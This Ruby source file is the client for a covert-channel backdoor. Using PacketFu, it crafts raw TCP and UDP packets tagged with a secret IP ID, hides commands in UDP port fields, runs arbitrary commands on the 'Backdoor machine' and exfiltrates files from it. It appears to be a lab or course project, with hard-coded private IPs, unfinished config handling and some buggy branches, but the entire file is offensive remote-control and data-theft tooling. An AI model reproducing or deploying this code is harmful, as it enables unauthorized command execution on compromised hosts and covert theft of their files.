# client.rb - Connects to a back-door server to issue commands, receive files, and change config
require 'rubygems'
require 'packetfu'
require 'timeout'

include PacketFu

# Define Config File Path
cfgFilePath = "./client-config"

# - - - - Definitions Start
# Load config from file
def loadConfig(path)
	#TODO: Load from file
	$identKey = 12345 # Identifies us to server
	$timeout = 10
	iName = "eth0"
	$interFace = "eth0" # Our interface name
	$dstIP = "192.168.119.133"
	$srcIP = "192.168.119.134"
	$cmdPort = 80 # TCP goes here
	cmdField = "seq-number" # Options: seq-number,ack-number
	$dataPort = "2289" # UDP goes here
	$dataCmdField = "src-port" # Options: src-port, dst-port
	userCmdRun = "20" # Identifies a run command
	$config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> iName)).config # set interface
    #$config = PacketFu::Config.new(:iface=> iName).config # use this line instead of above if you face `whoami?': uninitialized constant PacketFu::Capture (NameError)
end
# Custom checksum function (So we can use custom IP ID)
def ip_calc_sum(pkt)
        checksum =  (((pkt.ip_v  <<  4) + pkt.ip_hl) << 8) + pkt.ip_tos
        checksum += pkt.ip_len
        checksum +=  pkt.ip_id
        checksum += pkt.ip_frag
        checksum +=  (pkt.ip_ttl << 8) + pkt.ip_proto
        checksum += (pkt.ip_src >> 16)
        checksum += (pkt.ip_src & 0xffff)
        checksum += (pkt.ip_dst >> 16)
        checksum += (pkt.ip_dst & 0xffff)
        checksum = checksum % 0xffff 
        checksum = 0xffff - checksum
        checksum == 0 ? 0xffff : checksum
        return checksum
end
#Construct TCP Packet
def tcpConstruct(identKey,srcIP,srcPort,dstIP,dstPort,flags, payload)
	#--> Build TCP/IP
	puts "sending arp to #{dstIP}\n"
    dstMAC = PacketFu::Utils::arp(dstIP, :iface=>"eth0")
    puts "#{dstIP}: #{dstMAC}"
    #- Build Ethernet header:---------------------------------------
    pkt = PacketFu::TCPPacket.new(:config => $config , :flavor => "Linux")
    puts $config[:eth_src]
	pkt.eth_src =  $config[:eth_src] # Ether header: Source MAC ; you can use: pkt.eth_header.eth_src
	pkt.eth_dst =   PacketFu::EthHeader::mac2str(dstMAC)# Ether header: Destination MAC ; you can use: pkt.eth_header.eth_dst
    pkt.eth_proto	# Ether header: Protocol ; you can use: pkt.eth_header.eth_proto
    #- Build IP header:---------------------------------------
    pkt.ip_v = 4	# IP header: IPv4 ; you can use: pkt.ip_header.ip_v
    pkt.ip_hl = 5	# IP header: IP header length ; you can use: pkt.ip_header.ip_hl
    pkt.ip_tos	= 0	# IP header: Type of service ; you can use: pkt.ip_header.ip_tos
    pkt.ip_len	= 20	# IP header: Total Length ; you can use: pkt.ip_header.ip_len
    
    pkt.ip_frag = 0	# IP header: Don't Fragment ; you can use: pkt.ip_header.ip_frag
    pkt.ip_ttl = 115	# IP header: TTL(64) is the default ; you can use: pkt.ip_header.ip_ttl
    pkt.ip_proto = 6	# IP header: Protocol = tcp (6) ; you can use: pkt.ip_header.ip_proto
    pkt.ip_sum	# IP header: Header Checksum ; you can use: pkt.ip_header.ip_sum
    pkt.ip_saddr = srcIP	# IP header: Source IP. use $config[:ip_saddr] if you want your real IP ; you can use: pkt.ip_header.ip_saddr
    pkt.ip_daddr = dstIP	# IP header: Destination IP ; you can use: pkt.ip_header.ip_daddr
    #- TCP header:---------------------------------------
    pkt.payload = payload	# TCP header: packet header(body)
    pkt.tcp_flags.ack = flags[0]	# TCP header: Acknowledgment
    pkt.tcp_flags.fin = flags[1]	# TCP header: Finish
    pkt.tcp_flags.psh = flags[2]	# TCP header: Push
    pkt.tcp_flags.rst = flags[3]	# TCP header: Reset
    pkt.tcp_flags.syn = flags[4]	# TCP header: Synchronize sequence numbers
    pkt.tcp_flags.urg = flags[5]	# TCP header: Urgent pointer
    pkt.tcp_ecn = 0	# TCP header: ECHO
    pkt.tcp_win	= 8192	# TCP header: Window
    pkt.tcp_hlen = 5	# TCP header: header length
    pkt.tcp_src = srcPort	# TCP header: Source Port (random is the default )
    pkt.tcp_dst = dstPort	# TCP header: Destination Port (make it random/range for general scanning)
    pkt.recalc	# Recalculate/re-build whole pkt (should be at the end)
    pkt.ip_id = $identKey	# IP header: Identification ; you can use: pkt.ip_header.ip_id
    print pkt.ip_len
    pkt.ip_sum = ip_calc_sum(pkt)
    return pkt
end

def udpConstruct(identKey,srcIP,srcPort,dstIP,dstPort,payload)
	pkt = PacketFu::UDPPacket.new(:config => $config , :flavor => "Linux")
	dstMAC = PacketFu::Utils::arp(dstIP, :iface=>"eth0")
	pkt.eth_proto	# Ether header: Protocol ; you can use: pkt.eth_header.eth_proto
	pkt.eth_dst =   PacketFu::EthHeader::mac2str(dstMAC)
    #- Build IP header:---------------------------------------
    pkt.ip_v = 4	# IP header: IPv4 ; you can use: pkt.ip_header.ip_v
    pkt.ip_hl = 5	# IP header: IP header length ; you can use: pkt.ip_header.ip_hl
    pkt.ip_tos	= 0	# IP header: Type of service ; you can use: pkt.ip_header.ip_tos
    pkt.ip_len	= 20	# IP header: Total Length ; you can use: pkt.ip_header.ip_len
    pkt.ip_frag = 0	# IP header: Don't Fragment ; you can use: pkt.ip_header.ip_frag
    pkt.ip_ttl = 115	# IP header: TTL(64) is the default ; you can use: pkt.ip_header.ip_ttl
    pkt.ip_proto = 17	# IP header: Protocol = tcp (6) ; you can use: pkt.ip_header.ip_proto
    pkt.ip_sum	# IP header: Header Checksum ; you can use: pkt.ip_header.ip_sum
    pkt.ip_saddr = srcIP	# IP header: Source IP. use $config[:ip_saddr] if you want your real IP ; you can use: pkt.ip_header.ip_saddr
    pkt.ip_daddr = dstIP	# IP header: Destination IP ; you can use: pkt.ip_header.ip_daddr
    #- UDP header:---------------------------------------
    pkt.payload = payload
    pkt.udp_src = srcPort
    pkt.udp_dst = dstPort
    pkt.recalc	# Recalculate/re-build whole pkt (should be at the end)
    pkt.ip_id = $identKey	# IP header: Identification ; you can use: pkt.ip_header.ip_id
    pkt.ip_sum = ip_calc_sum(pkt)
    return pkt
end

def loadMenu(page)
	if page == "start"
		$status    = "Disconnected"
		$menuTitle = "Start Menu - Connect to the Backdoor, or change Config."
		$menuItems = ["1 - Connect to Backdoor", "2 - Ping Backdoor"]
		$prompt    = "Please make a selection: "
	end
	if page == "updateConfig"
		$status    = "Disconnected"
		$menuTitle = "Update Config - Review and Update Settings\nChange a setting by entering <num> <new value>\n"
		$menuItems = ["0 - Backdoor IP (Current Value: #{dstIP})", "1 - Command Port (Current Value: #{cmdPort})", 
			"2 - Data Port (Current Value: #{dataPort}", "3 - Secret Key (Current Value: #{identKey})"]
		$prompt     = "Update any variable: "
	end
	if page == "connected"
		$status    = "Connected"
		$menuTitle = "Main Menu - Communicate with Backdoor"
		$menuItems = ["0 - Run A Command", "1 - Download A File"]
		$prompt    = "Please make a selection: "
	end
	if page == "run"
		$status    = "Connected"
		$menuTitle = "Run A Command - Run any command on the Backdoor machine."
		$menuItems = []
		$prompt    = "Enter Command: "
	end
	if page == "file"
		$status    = "Connected"
		$menuTitle = "Exfiltrate - Get a file if you know the path"
		$menuItems = []
		$prompt    = "Enter File Path: "
	end
end

# Display Menu
def displayMenu(page,msg)
	loadMenu(page)
	system("clear")
	print "* * * * * * * * * * * * * * * * * * * * * * * * * *\n"
	print "* * * * * * * Backdoor Client Program * * * * * * *\n"
	print "* * * * * * * * * * * * * * * * * * * * * * * * * *\n"
	print "* * * Status:       #{$status}\n"
	print "* * * Backdoor IP:  #{$dstIP}\n"
	print "* * * Command Port: #{$cmdPort}\n"
	print "* * * Data Port:    #{$dataPort}\n"
	print "* * * * * * * * * * * * * * * * * * * * * * * * * *\n"
	if msg.length > 0
		print "-- #{msg} --\n"
	end
	print "* * * * * * * * * * * * * * * * * * * * * * * * * *\n"
	print "* * * #{$menuTitle}\n"
	print "* * * * * * * * * * * * * * * * * * * * * * * * * *\n"
	i=0
	while i < $menuItems.length do
		print "#{$menuItems[i]}\n"
		i = i + 1
	end
	print $prompt
end

# Add integer check to String class
class String
  def is_integer?
    self.to_i.to_s == self
  end
end

# Validate User Input
def validateUserInput(page, input)
	if page == "start"
		num = input[0,1]
		if num.is_integer? && num.to_i <= 3
			return true
		else
			displayMenu("start","Error: Invalid Selection")
			return false
		end
	end
	if page == "updateConfig"
		num = input[0,1]
		if num.is_integer? && num.to_i <= 4
			newVal = input.split(" ")[1]
			if !newVal.nil? && newVal.length <= 0
				displayMenu("updateConfig","Error: No Value Specified")
				return false
			end
			return true
		else
			displayMenu("updateConfig","Error: Invalid Selection")
			return false
		end
	end
	if page == "connected"
		num = input[0,1]
		if num.is_integer? && num.to_i <= 2
			return true
		else
			displayMenu("connected","Error: Invalid Selection")
			return false
		end
	end
	if page == "run"
		if input.length <= 0
			displayMenu("run","Error: Missing Command")
			return false
		end
		return true
	end
	if page == "file"
		if input.length <= 0
			displayMenu("file","Error: Missing Command")
			return false
		end
		return true
	end
end

# Update Config File
def updateConfigFile(path, field, value)
	# TODO: Update fields to File
end

# Establish Session with Backdoor
def establishSession(identKey,srcIP,srcPort,dstIP,dstPort,config)
	# Send SYN
	flags = [0,0,0,0,1,0]
	payload = ""
	tcpPacket = tcpConstruct(identKey,srcIP,srcPort,dstIP,dstPort,flags, payload)
	tcpPacket.to_w # Sent
	print "Session request sent, waiting for reply.\n"
	# Wait for Response
	
		status = Timeout::timeout($timeout) {
			capturedTCP = PacketFu::Capture.new(:iface => config[:iface], :start => true, :promisc => true, :filter => "tcp and src host #{dstIP}")
			capturedTCP.stream.each { |packet|
				pkt = Packet.parse packet
				# Check that it is a UDP packet
				if pkt.is_tcp?
					# Is it one of ours?
					puts "is it ours? #{identKey}"
					if pkt.ip_id == identKey
						# Should be a SYN/ACK to Confirm Session
						if pkt.tcp_flags.syn == 1 && pkt.tcp_flags.ack == 1
							
							return true
						end
					end
				end
			}
		}
		rescue Timeout::Error
			print "Error: No Response before Timout\n"
			return false
end

# Send Data - Max depends on field
def sendData(identKey,srcIP,dstIP,srcPort,dstPort,payload)
	udpPacket = udpConstruct(identKey,srcIP,srcPort,$dstIP,dstPort,payload)
	udpPacket.to_w # Sent
	print "Data Sent\n"
end

def sendStringUDP(input)
	# Split data up and send it
	srcBytes = []
	dstBytes = []
	finished = false
	input.each_byte { |byte|
		if srcBytes.length != 2
			srcBytes.push(byte)
		elsif dstBytes.length != 2
			dstBytes.push(byte)
		end
		# Full? Then Send!
		if srcBytes.length == 2 && dstBytes.length == 2
			sendData($identKey,$srcIP,$dstIP,srcBytes.pack("U*"),dstBytes.pack("U*"),"") # Sent
			# Clear Buffers
			srcBytes = []
			dstBytes = []
		end
	}
	# Do we have any bytes left to send?
	if srcBytes.length > 0
		if dstBytes.length > 0
			puts "dstBytes = #{dstBytes}\n"
			sendData($identKey,$srcIP,$dstIP,srcBytes.pack("U*"),dstBytes.pack("U*"),"") # Sent
		else
			sendData($identKey,$srcIP,$dstIP,srcBytes.pack("U*"),54321,"") # Sent with ending tag
		end
	end
	
	# All Bytes Sent, should we send closing packet?
	if !finished
		sendData($identKey,$srcIP,$dstIP,54321,54321,"") # Sent
	end
end
# - - - - End Functions

# Start Main
while true do
	# Get config from file
	loadConfig(cfgFilePath)

	# Display Start Page
	displayMenu("start","")

	# Get user input
	input = gets
	# Validate user input
	validInput = validateUserInput("start",input)
	if validInput
		num = input[0,1] # Option Number
		if num == "0" # Update Configuration
			while true do
				displayMenu("updateConfig","")
				input = gets
				validInput = validateUserInput("updateConfig",input)
				if validInput
					num = input[0,1] # Option Number
					if num == "0" # Update Backdoor IP
						updateConfigFile(cfgFilePath, "dstIP",input.split(" ")[1])
						redo
					elsif num == "1" # Update Command Port
						updateConfigFile(cfgFilePath, "cmdPort",input.split(" ")[1])
						redo
					elsif num == "2"
						updateConfigFile(cfgFilePath, "dataPort", input.split(" ")[1])
						redo
					elsif num == "3"
						updateConfigFile(cfgFilePath, "identKey", input.split(" ")[1])
						redo
					end
				end
			end
		end
		if num == "1" # Connect To Backdoor
			# Establish Session with Backdoor
			gotSession = establishSession($identKey,$srcIP,Random.rand(65535),$dstIP,$cmdPort,$config)
			if gotSession
				# Display Connected Page
				connectedMsg = "You are now connected to #{$dstIP}"
				while true do
					displayMenu("connected", connectedMsg)
					input = gets
					# Validate user input
					validInput = validateUserInput("start",input)
					if validInput
						num = input[0,1] # Option Number
						if num == "0" # Run a Command
							displayMenu("run","")
							input = gets
							valid = validateUserInput("run", input)
							if valid 
								sendStringUDP(input)
								
								# Listen for UDP data packets
								print "Listening for Data from #{$dstIP}\n"
								capturedUDP = PacketFu::Capture.new(:iface => $config[:iface], :start => true, :promisc => true, :filter => "udp")
								retrBytes = ""
								finalData = ""
								capturedUDP.stream.each { |packet|
									pkt = Packet.parse packet
									if pkt.is_udp? && pkt.ip_id == $identKey
										# Collect 2 bytes from src port first
										if pkt.udp_src == 54321
											puts "Got END cmd\n"
											break
										elsif
											# Add these bytes 
											finalData = finalData + [pkt.udp_src.to_s(16)].pack("H*")
										end
										# Now collect from dst port
										if pkt.udp_dst == 54321
											puts "Got END from dst\n"
											break
										elsif
											# Add bytes
											finalData = finalData + [pkt.udp_dst.to_s(16)].pack("H*")
										end
									end	
								}
								connectedMsg = "Command Output:\n#{finalData}"
							end
						elsif num == "1" # Get a File
							displayMenu("file", "")
							input = gets
							# Validate user input
							validInput = validateUserInput("file",input)
							if validInput
								# Send File Path
								sendStringUDP(input)
								
								# Wait for File
								print "Listening for File Data from #{$dstIP}\n"
								capturedUDP = PacketFu::Capture.new(:iface => $config[:iface], :start => true, :promisc => true, :filter => "udp")
								retrBytes = ""
								finalData = ""
								capturedUDP.stream.each { |packet|
									pkt = Packet.parse packet
									if pkt.is_udp? && pkt.ip_id == $identKey
										# Collect 2 bytes from src port first
										if pkt.udp_src == 54321
											puts "Got END cmd\n"
											break
										elsif
											# Add these bytes 
											finalData = finalData + [pkt.udp_src.to_s(16)].pack("H*")
										end
										# Now collect from dst port
										if pkt.udp_dst == 54321
											puts "Got END from dst\n"
											break
										elsif
											# Add bytes
											finalData = finalData + [pkt.udp_dst.to_s(16)].pack("H*")
										end
									end	
								}
								# Push the data into a file
								fileName = finalData.split("||")[0]
								fileData = finalData.split("||")[1]
								outFile = File.new(fileName, "w")
								outFile.puts(fileData)
								outFile.close
								
								connectedMsg = "File Created: #{fileName}\n"
							end
						end
					end
				end
			else
				# Session Failed, return to main menu
				redo
			end
		end
	end
end
# End Main
